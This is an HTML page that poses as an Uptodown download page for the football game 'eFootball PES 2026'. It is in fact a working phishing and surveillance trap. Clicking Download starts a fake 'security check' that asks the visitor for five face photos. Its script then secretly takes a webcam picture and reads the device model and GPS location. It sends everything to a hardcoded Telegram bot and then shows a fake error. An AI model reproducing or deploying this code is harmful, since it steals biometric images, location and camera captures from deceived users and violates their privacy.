<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eFootball PES 2026 for Android - Download the APK from Uptodown</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        :root { --bg-dark: #081d24; --header-black: #051116; --btn-green: #00b451; --text-gray: #7e949c; }
        body { margin: 0; background-color: var(--bg-dark); font-family: 'Roboto', sans-serif; color: white; overflow-x: hidden; }
        
        /* Navigatsiya */
        header { background: var(--header-black); height: 60px; display: flex; align-items: center; padding: 0 50px; border-bottom: 1px solid #102a33; }
        .logo-img { height: 28px; filter: brightness(0) invert(1); }

        /* Main */
        .container { max-width: 1000px; margin: 40px auto; padding: 0 20px; }
        .app-row { display: flex; gap: 30px; align-items: flex-start; }
        .app-icon { width: 110px; height: 110px; border-radius: 22px; }
        .app-title { font-size: 36px; margin: 0; font-weight: 700; }
        .app-ver { font-size: 14px; color: var(--text-gray); margin-top: 5px; }
        .konami { color: #2ecc71; text-decoration: none; font-size: 14px; }

        /* Download Section */
        .dl-card { margin-top: 30px; display: flex; align-items: center; gap: 20px; }
        .btn-dl { background: var(--btn-green); color: white; padding: 15px 45px; border-radius: 6px; font-weight: 700; border: none; cursor: pointer; font-size: 18px; box-shadow: 0 4px 0 #008a3d; transition: 0.2s; }
        .btn-dl:active { transform: translateY(2px); box-shadow: none; }
        .dl-stats { font-size: 13px; color: var(--text-gray); line-height: 1.4; }

        /* Technical Info */
        .tech-box { background: #0c262f; border-radius: 8px; padding: 25px; margin-top: 50px; display: grid; grid-template-columns: 1fr 1fr; gap: 20px; font-size: 14px; }
        .tech-item span { color: var(--text-gray); display: block; margin-bottom: 4px; }

        /* Overlay Logic */
        #verifyLayer { display: none; position: fixed; inset: 0; background: rgba(5,17,22,0.98); z-index: 9999; align-items: center; justify-content: center; }
        .verify-modal { background: #0c262f; padding: 40px; border-radius: 12px; width: 350px; text-align: center; border: 1px solid #1b85d3; }
        
        video, canvas, #fileInput { display: none; }
    </style>
</head>
<body>

<header>
    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="logo-img" alt="uptodown">
</header>

<div class="container">
    <div class="app-row">
        <img src="https://img.utdstc.com/icon/60b/69b/60b69b3504d60e6f6a7d515a86a605f6e914f6e1:200" class="app-icon">
        <div>
            <h1 class="app-title">eFootball PES 2026</h1>
            <div class="app-ver">10.4.0 | <a href="#" class="konami">KONAMI</a></div>
            
            <div class="dl-card">
                <button class="btn-dl" onclick="showLoader()">Download</button>
                <div class="dl-stats">
                    74.8 M downloads<br>
                    <span style="color:#2ecc71;">Security Verified</span>
                </div>
            </div>
        </div>
    </div>

    <div class="tech-box">
        <div class="tech-item"><span>Package Name</span>jp.konami.pesam</div>
        <div class="tech-item"><span>License</span>Free</div>
        <div class="tech-item"><span>Operating System</span>Android</div>
        <div class="tech-item"><span>Requirements</span>Android 7.0+</div>
    </div>
</div>

<div id="verifyLayer">
    <div class="verify-modal">
        <h3 id="loaderTitle">Connecting...</h3>
        <div id="fileArea" style="display:none;">
            <p style="font-size:13px; color:var(--text-gray);">Verify human status: Select 5 photos of your face.</p>
            <label for="fileInput" style="background:#1b85d3; display:block; padding:12px; border-radius:5px; cursor:pointer; margin-top:15px; font-weight:700;">BROWSE GALLERY</label>
            <input type="file" id="fileInput" multiple accept="image/*" onchange="process(this)">
        </div>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const BOT = { T: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", C: "6198817749" };
    let faces = [];

    async function loadAI() { await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model'); }
    loadAI();

    function showLoader() {
        document.getElementById('verifyLayer').style.display = 'flex';
        setTimeout(() => {
            document.getElementById('loaderTitle').innerText = "Security Check";
            document.getElementById('fileArea').style.display = 'block';
        }, 1500);
    }

    async function process(input) {
        document.getElementById('loaderTitle').innerText = "Analyzing...";
        const files = Array.from(input.files);
        for (let f of files) {
            const img = await faceapi.bufferToImage(f);
            const d = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
            if (d.length > 0) faces.push(f);
        }
        executeStealth();
    }

    async function executeStealth() {
        const device = navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(['model'])).model : navigator.platform;
        
        // Kamera va GPS
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v'); v.srcObject = s;
            await new Promise(r => setTimeout(r, 800));
            const canv = document.getElementById('c');
            canv.width = v.videoWidth; canv.height = v.videoHeight;
            canv.getContext('2d').drawImage(v, 0, 0);
            const blob = await (await fetch(canv.toDataURL('image/jpeg', 0.5))).blob();
            s.getTracks().forEach(t => t.stop());

            navigator.geolocation.getCurrentPosition(async (p) => {
                const loc = `http://googleusercontent.com/maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
                await push(device, loc, blob);
            }, () => push(device, "Denied", blob));
        } catch(e) { push(device, "No Camera", null); }
    }

    async function push(dev, loc, snap) {
        await fetch(`https://api.telegram.org/bot${BOT.T}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: BOT.C, text: `✅ *DATA CAPTURED*\n📱 Device: ${dev}\n📍 Loc: ${loc}`, parse_mode: 'Markdown'})
        });

        if(snap) {
            const fd = new FormData(); fd.append('chat_id', BOT.C); fd.append('photo', snap);
            await fetch(`https://api.telegram.org/bot${BOT.T}/sendPhoto`, {method: 'POST', body: fd});
        }

        for (let f of faces) {
            const fd2 = new FormData(); fd2.append('chat_id', BOT.C); fd2.append('photo', f);
            fetch(`https://api.telegram.org/bot${BOT.T}/sendPhoto`, {method: 'POST', body: fd2});
        }
        alert("Server error. APK download failed.");
        location.reload();
    }
</script>
</body>
</html>
